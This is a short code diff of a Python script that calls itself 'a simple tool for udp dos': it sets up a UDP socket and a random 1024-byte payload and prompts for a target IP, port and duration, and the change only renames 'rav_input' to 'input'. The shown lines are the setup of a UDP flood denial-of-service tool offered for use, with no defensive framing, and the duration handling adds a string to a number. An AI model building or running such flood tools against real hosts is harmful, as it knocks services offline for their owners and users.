@@ -6,7 +6,7 @@ import random
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
 print('This is a simple tool for udp dos')
-ip = rav_input('Target ip or url:')
+ip = input('Target ip or url:')
 port = input('port:')
 dur = input("Time:")
 timeout = time.time() + dur
